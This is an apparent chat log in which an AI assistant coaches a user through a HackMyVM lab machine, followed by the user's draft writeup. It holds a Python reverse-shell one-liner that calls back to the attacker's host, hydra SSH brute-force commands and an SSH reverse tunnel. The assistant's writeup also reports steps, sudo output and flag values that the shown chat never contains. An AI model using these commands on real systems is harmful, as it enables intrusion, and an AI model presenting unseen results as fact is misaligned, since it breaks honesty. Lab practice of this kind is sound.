@@ -1,0 +1,1442 @@
+
+
+
+hey i am solving machine from hackmyvm but if i keep both my attacking machine and kali on hostonly then internet doesn't work what can be done
+
+Yeah, that’s expected behavior — Host-Only networking is isolated by design, so your Kali box won’t have internet access. But there are clean ways to fix this without breaking your lab setup.
+
+Here’s the proper way to handle it 👇
+
+🧠 Why this happens
+Host-Only Adapter
+
+Communication: ✅ Host ↔ VM, VM ↔ VM
+
+Internet: ❌ No internet access
+
+So when both machines are on Host-Only, they can talk to each other, but nothing goes outside.
+
+✅ Best Practice (Used by pros in labs)
+👉 Add two network adapters to Kali
+Adapter 1 → NAT (for internet)
+Adapter 2 → Host-Only (for lab communication)
+
+⚙️ How to configure (VirtualBox)
+🔹 Kali (Attacker Machine)
+Adapter 1: NAT
+
+Adapter 2: Host-Only Adapter
+
+🔹 Target Machine (HackMyVM)
+Adapter 1: Host-Only Adapter only
+
+🔍 What you’ll get
+On Kali, run:
+
+ip a
+You’ll see something like:
+
+eth0 → NAT (internet)
+
+eth1 → Host-Only (target communication)
+
+🚀 How to use it
+Use Host-Only IP to attack target
+(example: 192.168.56.x)
+
+Internet tools (apt, pip, wordlists, etc.) will work via NAT
+
+⚠️ Common mistake
+Don’t attack using the NAT IP — it won’t reach the target.
+
+💡 Alternative (less recommended)
+You could use:
+
+Bridged Adapter (both machines)
+
+But:
+
+Depends on your real network
+
+Can expose lab machines to your LAN
+
+Less controlled than Host-Only
+
+🧪 Quick sanity check
+From Kali:
+
+ping 8.8.8.8        # internet (should work)
+ping <target-ip>    # host-only (should work)
+🔥 Real-world mindset (important for you)
+What you're doing here is basically network segmentation — something you’ll see in real environments:
+
+Internal network (like Host-Only)
+
+External access (like NAT)
+
+Understanding this properly will help you later in:
+
+Pivoting
+
+Lateral movement
+
+VPN-based bug bounty setups
+
+If you want, I can help you:
+
+Set up a perfect pentesting lab topology
+
+Or debug your current config (just drop ip a + VirtualBox settings)
+
+You’re on the right track 👍
+
+
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:43:8a:e6 brd ff:ff:ff:ff:ff:ff
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:c8:88:9a brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.106/24 brd 192.168.56.255 scope global dynamic noprefixroute eth1
+       valid_lft 582sec preferred_lft 582sec
+    inet6 fe80::a00:27ff:fec8:889a/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+Show more
+
+Good — this output tells us exactly what’s wrong.
+
+👉 Your Host-Only (eth1) is working:
+
+192.168.56.106 → ✅ correct lab network
+
+👉 But your NAT (eth0) has NO IP assigned:
+
+❌ No inet line under eth0
+
+That’s why internet is not working
+
+🔥 Fix this step-by-step
+1️⃣ First, try DHCP on eth0
+Run:
+
+sudo dhclient eth0
+Then check:
+
+ip a
+👉 You should now see something like:
+
+inet 10.0.2.15/24
+2️⃣ If that doesn’t work → check VirtualBox config
+Go to your Kali VM settings:
+
+Adapter 1 (IMPORTANT)
+Attached to: NAT
+
+Cable connected: ✅ (must be checked)
+
+Adapter 2
+Attached to: Host-Only Adapter
+
+Usually: vboxnet0
+
+3️⃣ Restart networking (just in case)
+sudo systemctl restart networking
+Or:
+
+sudo dhclient -v eth0
+🧪 Final expected state
+Run:
+
+ip a
+You should have:
+
+eth0 → 10.0.2.x (internet via NAT)
+
+eth1 → 192.168.56.x (target network)
+
+✅ Test it
+ping 8.8.8.8        # should work
+ping google.com     # DNS test
+⚠️ If still broken (rare but happens)
+Try manually assigning:
+
+sudo ip addr add 10.0.2.15/24 dev eth0
+sudo ip route add default via 10.0.2.2
+echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
+🧠 What’s happening here (important for your level)
+eth1 (192.168.56.x) → isolated lab network
+
+eth0 (10.0.2.x) → VirtualBox NAT DHCP
+
+Right now, your Kali is basically blind to the internet because DHCP didn’t assign eth0.
+
+If you want, next step I can show you:
+👉 how to route traffic through target (pivoting setup) — this exact setup is the foundation for real bug bounty/internal pentests.
+
+
+
+Pasted text(44).txt
+Document
+????
+
+Alright, now I see the full picture.
+
+Your networking issue is already fixed partially — your Kali has:
+
+eth1 → 192.168.56.106 ✅ (Host-Only working)
+
+eth0 → NO IP ❌ (NAT not working → no internet)
+
+🔴 But your real problem right now is THIS:
+From your tool output:
+
+(ghost)> connect 192.168.56.108
+[-] Failed to connect
+👉 This is NOT a networking config issue anymore
+👉 This is a target/service issue
+
+🧠 Let’s break it properly
+You are trying to connect to:
+
+192.168.56.108
+But connection is failing.
+
+That means ONE of these is true:
+
+❌ 1. Target machine is OFF
+❌ 2. Target IP is wrong
+❌ 3. Port is closed (VERY likely)
+❌ 4. Service not running (ADB / whatever Ghost expects)
+✅ Step-by-step debugging (do this EXACTLY)
+1️⃣ Check target is alive
+ping 192.168.56.108
+If ❌ no reply → target is down / wrong IP
+
+If ✅ reply → move next
+
+2️⃣ Scan ports (IMPORTANT)
+nmap -p- 192.168.56.108
+👉 You are trying:
+
+192.168.56.108:5555
+So check:
+
+Is 5555 open?
+
+3️⃣ If 5555 is CLOSED
+Then Ghost will NEVER connect.
+
+👉 That tool expects something like:
+
+ADB exposed
+
+Or specific backdoor/service
+
+⚠️ Reality check (important)
+From your log: 
+
+
+You're using:
+
+Ghost Framework → adb-shell based tooling
+That means:
+👉 Target must have:
+
+ADB enabled
+
+Port 5555 open
+
+💥 Most likely issue (95%)
+👉 Your target machine does NOT have ADB running
+
+So connection fails.
+
+✅ What you should do instead
+🔍 Proper enumeration first (don’t jump tools)
+Run:
+
+nmap -sC -sV 192.168.56.108
+Then decide:
+
+Web? → browser + Burp
+
+SSH? → brute / creds
+
+Custom service? → analyze
+
+🧠 Brutal truth (you need this)
+Right now you're doing:
+
+“Tool first → hope it works”
+
+That’s backwards.
+
+Correct flow:
+
+Recon → Identify service → Choose attack → Exploit
+⚡ Quick summary
+Your Host-Only network is ✅ working
+
+Your NAT internet is ❌ (fix with dhclient eth0)
+
+Your exploit failure = ❌ wrong service assumption
+
+👉 Next step (do this)
+Send me:
+
+nmap -sC -sV 192.168.56.108
+I’ll guide you exactly how to break that machine — no guessing, no wasted time.
+
+
+ection spawned!
+ 
+[*] Loading device modules...
+[i] Modules loaded: 13
+(ghost: 192.168.56.107)> ls
+[-] Unrecognized command: ls
+(ghost: 192.168.56.107)> whoami
+[-] Unrecognized command: whoami
+(ghost: 192.168.56.107)> path
+[-] Unrecognized command: path
+(ghost: 192.168.56.107)> aslf
+[-] Unrecognized command: aslf
+(ghost: 192.168.56.107)> l
+Usage: list <remote_path>
+(ghost: 192.168.56.107)> list home
+[-] Failed to list directory!
+(ghost: 192.168.56.107)> list /etc/passwd
+[-] Failed to list directory!
+(ghost: 192.168.56.107)> list /etc/passwd/
+[-] Failed to list directory!
+(ghost: 192.168.56.107)> source
+:                                                                                     
+(ghost: 192.168.56.107)> ls
+[-] Unrecognized command: ls
+(ghost: 192.168.56.107)>
+Show more
+
+Good — now you’ve actually got a connection, so networking is no longer your issue 👍
+
+But you’ve run into something else:
+
+👉 This is NOT a normal shell
+
+🧠 What’s happening
+You’re inside Ghost Framework session, not a Linux shell.
+
+That’s why:
+
+ls
+whoami
+❌ don’t work
+
+Because:
+👉 Ghost uses its own command set, not standard Linux commands
+
+🔥 Key mistake you’re making
+You’re treating it like:
+
+“I got shell access”
+
+But reality:
+
+You got a limited remote interface (likely ADB / agent-based)
+
+✅ What your output tells me
+Modules loaded: 13
+👉 That means:
+
+You have a module-based interaction system
+
+Commands like ls, whoami won’t work directly
+
+⚡ Correct way to interact
+1️⃣ See available commands
+Try:
+
+help
+or
+
+?
+2️⃣ Use correct syntax (you already saw hint)
+You typed:
+
+l
+It replied:
+
+Usage: list <remote_path>
+So correct usage is:
+
+list /
+NOT:
+
+list /etc/passwd   ❌ (file, not directory)
+✅ Try these commands now
+list /
+list /home
+list /sdcard
+list /data
+⚠️ Why your previous commands failed
+list /etc/passwd
+❌ That’s a file, not a directory
+👉 Tool expects directory listing
+
+🧠 Important insight (this matters for your growth)
+What you likely have:
+
+ADB-style access
+
+Limited permissions
+
+No full shell yet
+
+So your goal is:
+
+Enumeration → find writable locations → escalate → get real shell
+💥 What you should check next
+Try:
+
+list /data/data
+list /system
+list /storage
+Look for:
+
+App directories
+
+Config files
+
+Anything writable
+
+⚡ If you want a REAL shell
+Ghost usually has modules like:
+
+shell
+
+exec
+
+spawn
+
+Try:
+
+shell
+or
+
+exec sh
+🧠 Reality check (important for bug bounty mindset)
+Right now you're at:
+
+“Access ≠ Control”
+
+You have:
+
+Entry point ✅
+But NOT:
+
+Full command execution ❌
+
+🚀 Next move
+Run:
+
+help
+Then send me the output.
+
+I’ll map:
+👉 Which module to use
+👉 How to break out into real shell
+👉 How to escalate this properly
+
+You’re close — just need to stop treating tools like magic and start reading what they actually give you.
+
+
+
+(ghost: 192.168.56.107)> shell
+Usage: shell <command>
+(ghost: 192.168.56.107)> shell exec
+[-] Socket is not connected!
+None
+(ghost: 192.168.56.107)> shell -h
+[-] Socket is not connected!
+None
+Show more
+
+Alright — this is where you need to slow down and read what the tool is telling you.
+
+🔴 The key error
+[-] Socket is not connected!
+That means:
+
+👉 Your Ghost session is NOT stable / not fully connected
+👉 You don’t actually have a working interactive channel
+
+🧠 What likely happened
+Earlier you saw:
+
+Connection spawned!
+Modules loaded: 13
+That looks like success, but in reality:
+
+✔ Partial connection established
+
+❌ Control channel (socket) died / never completed
+
+⚡ Why your commands fail
+When you run:
+
+shell exec
+Ghost tries to:
+👉 Send command over socket
+👉 But socket = ❌ dead
+
+So everything fails.
+
+🔍 Root causes (very common in labs)
+1️⃣ Target service is unstable
+ADB drops connection
+
+Service crashes after connect
+
+2️⃣ Wrong port / incomplete service
+You connected, but it’s not a full agent
+
+3️⃣ Network inconsistency
+VM networking glitch (rare but happens)
+
+✅ Fix it properly (don’t guess)
+Step 1 — Verify target is STILL alive
+ping 192.168.56.107
+Step 2 — Check port again
+nmap -p 5555 192.168.56.107
+👉 If port closed now → service died
+
+Step 3 — Reconnect cleanly
+Exit Ghost completely:
+
+exit
+Restart tool and reconnect:
+
+connect 192.168.56.107:5555
+Step 4 — Immediately test stability
+Right after connecting:
+
+help
+If that fails → session is fake / broken
+
+💥 Important reality (don’t ignore this)
+Ghost Framework is:
+
+Not super reliable
+
+Very dependent on proper ADB/service setup
+
+👉 In CTFs / HackMyVM:
+You’re often NOT supposed to use it blindly
+
+🧠 What you SHOULD do instead (this is the real move)
+Stop forcing Ghost.
+
+Go back and verify:
+
+nmap -sC -sV 192.168.56.107
+👉 Ask:
+
+What service is actually running?
+
+Is it really ADB?
+
+Or something else?
+
+⚠️ Brutal truth (you need this)
+Right now you're doing:
+
+“Tool not working → try random commands”
+
+That wastes time.
+
+Correct approach:
+
+Identify service → understand protocol → use correct exploit
+🚀 What I want from you next
+Run this and send output:
+
+nmap -sC -sV 192.168.56.107
+I’ll tell you:
+
+Whether Ghost even makes sense here
+
+Or you’re chasing the wrong attack path
+
+You’re actually close — just need to switch from tool-driven to logic-driven hacking.
+
+
+Nmap scan report for 192.168.56.107
+Host is up, received reset ttl 255 (0.0020s latency).
+Scanned at 2026-04-24 00:56:02 +1245 for 6s
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey: 
+|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMn+ANUyHwmNWHCBCNEevXEDdony9CC/L/mswWy2QPfo6dGeYVo2nr5m31TOVyka83Rip8dkEifkNqU6gWkXezQ=
+|   256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKWBvhip783XnDTvLFztqGGwoe7JnTYbc6dvpjTarJg
+5555/tcp open  adb     syn-ack ttl 64 Android Debug Bridge (token auth required)
+Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel
+Show more
+
+Now this is solid data — and it clears up everything.
+
+🧠 What you actually have
+22 → SSH (OpenSSH 9.9)
+
+5555 → ADB (Android Debug Bridge)
+
+👉 And the important part:
+
+adb (token auth required)
+🔴 Why Ghost is failing
+Ghost is trying to connect to ADB like it’s open access.
+
+But:
+👉 ADB requires authentication (RSA key pairing)
+👉 So you don’t have real access
+
+That’s why:
+
+Connection “spawns” ✅
+
+But commands fail ❌ (Socket not connected)
+
+🧠 What this means (important)
+This is NOT:
+
+“Exploit ADB and get shell instantly”
+
+This IS:
+
+“ADB is exposed → now find a way to bypass or get creds”
+
+⚡ Correct attack paths (real pentesting thinking)
+🔹 Path 1 — Try direct ADB connection
+adb connect 192.168.56.107:5555
+adb devices
+👉 If unauthorized:
+
+device unauthorized
+Then you’re blocked.
+
+🔹 Path 2 — Check if auth is bypassable
+Older Androids had:
+
+No auth
+
+Weak auth
+
+👉 But yours explicitly says:
+
+token auth required
+So:
+❌ No easy win here
+
+🔥 Path 3 — Switch to SSH (THIS is your real entry)
+You have:
+
+22/tcp open  ssh
+👉 This is your main attack surface
+
+🚀 What to do now (do this exactly)
+1️⃣ Username enumeration
+Try:
+
+hydra -L /usr/share/wordlists/usernames.txt -p test 192.168.56.107 ssh
+Or test common users:
+
+ssh root@192.168.56.107
+ssh admin@192.168.56.107
+ssh user@192.168.56.107
+2️⃣ Password brute force (if needed)
+hydra -l root -P rockyou.txt ssh://192.168.56.107
+3️⃣ Check for hints (CTF mindset)
+Sometimes:
+
+Username = machine name
+
+Or hidden in web (if any)
+
+Or in description
+
+🧠 High-level lesson (this is big)
+You almost went down the wrong path:
+
+“Port open → use tool → force exploit”
+
+But real workflow:
+
+Scan → Understand service → Check constraints → Choose viable path
+ADB looked sexy — but:
+👉 SSH is your real entry point
+
+⚡ Quick summary
+Ghost failed because → ADB auth required
+
+You don’t have ADB access ❌
+
+Your real target → SSH ✅
+
+👉 Next move
+Try:
+
+ssh root@192.168.56.107
+If it fails, tell me:
+
+error message
+
+or Hydra results
+
+I’ll guide you to the next step (likely privilege escalation path after login).
+
+
+python3 shell stabilizer
+
+You’re jumping a step ahead.
+
+👉 “Python shell stabilizer” only makes sense AFTER you already have a shell.
+Right now, you don’t have a working shell at all — your Ghost session is not a real TTY.
+
+🧠 What stabilizer actually does
+When you get a reverse shell like this:
+
+/bin/sh
+It’s:
+
+No tab completion ❌
+
+No proper input ❌
+
+No job control ❌
+
+So you upgrade it using Python.
+
+✅ Proper stabilizer command
+Once you have a shell, run:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Then press:
+
+CTRL + Z
+Then:
+
+stty raw -echo; fg
+Then:
+
+export TERM=xterm
+🔴 But your current situation
+You tried:
+
+(ghost)> shell exec
+[-] Socket is not connected!
+👉 That means:
+
+❌ No shell
+
+❌ Nothing to stabilize
+
+⚡ What you should focus on instead
+Right now your priorities are:
+
+1️⃣ Get initial access (real shell)
+SSH brute / creds
+
+Or actual exploit
+
+2️⃣ THEN stabilize
+🧠 Real pentesting flow (lock this in)
+Access → Shell → Stabilize → Enumerate → PrivEsc
+You are currently stuck at:
+
+❌ Access (proper one)
+🚀 What I want you to do next
+Try SSH:
+
+ssh root@192.168.56.107
+OR brute:
+
+hydra -l root -P rockyou.txt ssh://192.168.56.107
+💥 Straight truth
+Using:
+
+Ghost + random shell commands
+
+…won’t get you anywhere here.
+
+👉 This machine is clearly pushing you toward:
+
+SSH access
+
+Then privilege escalation
+
+👉 Once you get shell
+Come back and say:
+
+“I got shell”
+
+Then I’ll show you:
+
+proper stabilization
+
+enum script strategy
+
+privesc path
+
+Right now — focus on getting in first.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+└─# nc -lvnp 4444               
+Listening on 0.0.0.0 4444
+Connection received on 192.168.56.107 57926
+/ $ ^[[5;5R
+
+/ $ ^[[7;5Rwhoami
+whoami
+runner
+/ $ which python3
+which python3
+/usr/bin/python3
+/ $ ^[[13;5R
+
+/ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib/python3.12/pty.py", line 195, in spawn
+    os.execlp(argv[0], *argv)
+  File "<frozen os>", line 592, in execlp
+  File "<frozen os>", line 609, in execvp
+  File "<frozen os>", line 632, in _execvpe
+FileNotFoundError: [Errno 2] No such file or directory
+/ $ ^[[25;5R
+
+/ $ ^[[27;5Rpython3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib/python3.12/pty.py", line 195, in spawn
+    os.execlp(argv[0], *argv)
+  File "<frozen os>", line 592, in execlp
+  File "<frozen os>", line 609, in execvp
+  File "<frozen os>", line 632, in _execvpe
+FileNotFoundError: [Errno 2] No such file or directory
+/ $ ^[[37;5Rnetstat -tunlp
+netstat -tunlp
+netstat: showing only processes with your user ID
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2474/python3
+tcp        0      0 :::22                   :::*                    LISTEN      -
+/ $ ^[[40;5Rpython3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+/ $ ^[[40;5R
+
+/ $ python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+/ $ ^[[40;5R
+Show more
+
+Now this is real progress — you actually have a shell 👍
+
+Let’s clean it up and move forward properly.
+
+🧠 What just happened
+You got reverse shell → ✅
+
+You are user:
+
+runner
+Python worked but:
+
+/bin/bash ❌ not found
+👉 That means:
+Target doesn’t have bash installed
+
+✅ Correct stabilization (your case)
+You already did the right fallback:
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+That’s correct ✔
+
+⚠️ Why it still looks broken
+You see weird stuff like:
+
+^[[5;5R
+👉 That means:
+
+No proper TTY settings yet
+
+🔥 Fix it fully (important)
+Step 1 — Background shell
+Press:
+
+CTRL + Z
+Step 2 — Fix terminal on Kali
+Run:
+
+stty raw -echo; fg
+Step 3 — Set environment
+Inside shell:
+
+export TERM=xterm
+Then:
+
+stty rows 40 columns 120
+🧪 Test it
+Now try:
+
+clear
+ls
+id
+👉 Should behave normally now
+
+🧠 What you discovered (important clue)
+From:
+
+netstat -tunlp
+You saw:
+
+0.0.0.0:5555 → python3
+👉 This confirms:
+
+That ADB-like service you saw earlier
+
+Is actually Python-based service running as runner
+
+💥 That’s a HUGE clue for privesc / lateral movement later
+
+🚀 Next step (don’t rush)
+Now you're here:
+
+Access ✅
+Stabilized shell ⚠️ (fix now)
+Next phase:
+
+→ Enumeration
+🔍 Start enum NOW
+Run these:
+
+id
+uname -a
+pwd
+ls -la
+Then:
+
+find / -perm -4000 2>/dev/null
+And:
+
+sudo -l
+💡 Big observation (don’t ignore)
+You are:
+
+runner
+👉 Not root
+👉 Likely limited user
+👉 There WILL be privilege escalation
+
+🧠 Real hacker mindset (this is where skill builds)
+Now your job is:
+
+Understand system → find weakness → escalate
+NOT:
+
+throw tools randomly
+
+👉 Next step
+Send me output of:
+
+id
+sudo -l
+ls -la /home
+I’ll guide you exactly how to escalate this box.
+
+
+
+Pasted text(45).txt
+Document
+create a full detailed writeup so that i can put it on my github
+
+Here’s a clean, structured, GitHub-ready writeup based on your work. I’ve kept your flow but refined it so it looks professional and readable.
+
+🚀 HackMyVM Writeup – ADB + Internal Pivot + Key Extraction
+📌 Machine Overview
+Platform: HackMyVM
+
+Difficulty: Easy
+
+Target IP: 192.168.56.107
+
+🔍 Initial Reconnaissance
+We start with an Nmap scan:
+
+nmap -sC -sV 192.168.56.107
+🧾 Results
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.9
+5555/tcp open  adb     Android Debug Bridge (token auth required)
+🧠 Observations
+Port 22 (SSH) → Potential entry but no credentials
+
+Port 5555 (ADB) → Interesting attack surface
+
+👉 ADB exposure often leads to direct shell access.
+
+⚡ Initial Access via ADB
+We attempt to connect:
+
+adb connect 192.168.56.107
+adb devices -l
+adb shell
+✅ Success
+/ $ whoami
+runner
+We now have a low-privileged shell.
+
+🔁 Reverse Shell for Stability
+ADB shell is unstable, so we upgrade it:
+
+nohup python3 -c 'import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.56.106",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh")' &
+On attacker machine:
+
+nc -lvnp 4444
+🧠 Shell Stabilization
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+CTRL + Z
+stty raw -echo; fg
+export TERM=xterm
+🔍 Enumeration
+Check running services:
+netstat -tunlp
+🧾 Output
+0.0.0.0:22      → SSH
+127.0.0.1:80    → Internal web service
+0.0.0.0:5555    → python3
+🚨 Key Finding
+👉 Internal web service running on:
+
+127.0.0.1:80
+Not accessible externally.
+
+🔄 Pivoting (SSH Reverse Tunnel)
+We forward the internal web service:
+
+ssh -R 8080:127.0.0.1:80 kali@192.168.56.106
+Now accessible locally at:
+
+http://127.0.0.1:8080
+🔎 Web Enumeration
+Fuzzing revealed endpoints:
+
+line1
+line2
+line3
+line4
+line5
+💥 Blind File Extraction
+A custom script was used to extract hidden data character-by-character:
+
+📄 Script reference: 
+
+
+bash bf.sh
+🔐 Extracted Data
+Output:
+
+line1: b3BlbnNzaC1rZXktdjEAAAAA...
+line2: ...
+line3: ...
+line4: ...
+line5: ...
+🔑 Reconstruct SSH Private Key
+echo "-----BEGIN OPENSSH PRIVATE KEY-----" > asahi_key
+tr -d '\n ' < output.txt >> asahi_key
+echo -e "\n-----END OPENSSH PRIVATE KEY-----" >> asahi_key
+chmod 600 asahi_key
+🔓 SSH Access
+ssh -i asahi_key asahi@192.168.56.107
+🏁 User Flag
+cat user.flag
+flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+🔼 Privilege Escalation
+Check sudo permissions:
+
+sudo -l
+🧾 Output
+(ALL : ALL) NOPASSWD: ALL
+💥 Root Access
+sudo su
+🏁 Root Flag
+cat /root/root.flag
+flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
+🧠 Key Takeaways
+ADB exposure can lead to initial access
+
+Always check internal-only services
+
+SSH tunneling is critical for pivoting
+
+Blind extraction techniques are powerful
+
+Misconfigured sudo = instant root
+
+⚡ Final Chain
+ADB → Shell → Reverse Shell → Pivot → Web Enum → Key Extraction → SSH → Root
+If you want, I can next:
+
+Turn this into a perfect README.md format with badges + styling
+
+Or make it look like top-tier GitHub hacker portfolio writeups
+
+
+
+So today again we are going to solve another easy machine from HackMyVM for practicing our offensive security/pentesting skills.
+
+So we get the hint when the machine boots up which is the IP only.
+Main IP :: 192.168.56.107
+
+And we get something interesting port 22,and 5555
+
+Nmap scan report for 192.168.56.107
+Host is up, received reset ttl 255 (0.0020s latency).
+Scanned at 2026-04-24 00:56:02 +1245 for 6s
+
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey:
+| 256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMn+ANUyHwmNWHCBCNEevXEDdony9CC/L/mswWy2QPfo6dGeYVo2nr5m31TOVyka83Rip8dkEifkNqU6gWkXezQ=
+| 256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKWBvhip783XnDTvLFztqGGwoe7JnTYbc6dvpjTarJg
+5555/tcp open adb syn-ack ttl 64 Android Debug Bridge (token auth required)
+Service Info: OS: Android; CPE: cpe:/o:linux
+
+Android Debug Bridge (adb) is a command-line tool to communicate with Android-based devices and emulators. Typical actions include installing packages, debugging, and getting an interactive Unix shell on the device.
+
+If you find ADB exposed and reachable, try connecting and enumerating quickly:
+
+adb connect [:] # Default is 5555 for classic mode
+adb devices -l # Confirm it shows as "device" (not unauthorized/offline)
+adb shell # Get an interactive shell (uid usually shell)
+whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port
+adb root || true # Works on eng/userdebug/insecure builds, many emulators/IoT
+
+adb connect 192.168.56.107
+connected to 192.168.56.107:5555
+
+┌──(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+└─# adb devices -l
+List of devices attached
+192.168.56.107:5555 device transport_id:1
+
+┌──(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+└─# adb shell
+/ $ ls
+bin home mnt run tmp
+boot lib opt sbin usr
+dev lost+found proc srv var
+etc media root sys
+/ $ whoami
+runner
+
+
+
+so with this we are able to connect to the device.
+
+once on device try to get uinfo.
+
+id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint
+uid=1000(runner) gid=1000(runner) groups=1000(runner)
+/bin/sh: getenforce: not found
+/bin/sh: getprop: not found
+
+we can also use the automated tool for this too.
+
+git clone https://github.com/EntySec/ghost
+
+pip3 install git+https://github.com/EntySec/Ghost
+
+adb -s 192.168.56.107:5555 shell
+/ $ whoami
+runner
+/ $ ls
+bin home mnt run tmp
+boot lib opt sbin usr
+dev lost+found proc srv var
+etc media root sys
+/ $ cd /home
+/home $ ls
+asahi runner
+
+so with this we get this shell but get's disconnected after sometime.
+
+adb shell
+nohup python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.106",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
+nohup: appending output to /home/runner/nohup.out
+
+now with this we will get the shell let's stabilize it faster.
+
+netstat -tunlp
+netstat: showing only processes with your user ID
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
+tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN -
+tcp 0 0 0.0.0.0:5555 0.0.0.0:* LISTEN 2474/python3
+tcp 0 0 :::22
+
+so we can see there is an internal ssh port 22 as well as web service.
+
+env)─(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+┌──(env)─(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+└─# systemctl start ssh
+
+┌──(env)─(root㉿kali)-[/home/kali/hackmyvm/fuzz]
+└─# systemctl status ssh
+● ssh.service - OpenBSD Secure Shell server
+Loaded: loaded (/usr/lib/systemd/system/ssh.service; disabled; preset: disabled)
+Active: active (running) since Tue 2026-04-28 22:36:54 +1245; 4s ago
+Invocation: ee312d4e9afd422e957811f563ab4fdf
+Docs: man(8)
+man(5)
+Process: 17162 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
+Main PID: 17165 (sshd)
+Tasks: 1 (limit: 13923)
+Memory: 2.1M (peak: 2.8M)
+CPU: 32ms
+CGroup: /system.slice/ssh.service
+└─17165 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+
+Apr 28 22:36:54 kali systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...
+Apr 28 22:36:54 kali sshd[17165]: Server listening on 0.0.0.0 port 22.
+Apr 28 22:36:54 kali sshd[17165]: Server listening on :: port 22.
+Apr 28 22:36:54 kali systemd[1]: Started ssh.service - OpenBSD Secure Shell server
+
+
+
+on our machine
+
+now
+
+ssh -R 8080:127.0.0.1:80 kali@192.168.56.106
+
+
+
+└─$ ss -atn | grep :22
+
+LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
+ESTAB 36 0 192.168.56.106:22 192.168.56.107:59726
+LISTEN 0 128 [::]:22 [::]:*
+
+line [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
+line2 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
+line1 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
+line3 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
+line4 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
+[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
+line01 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
+line02 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
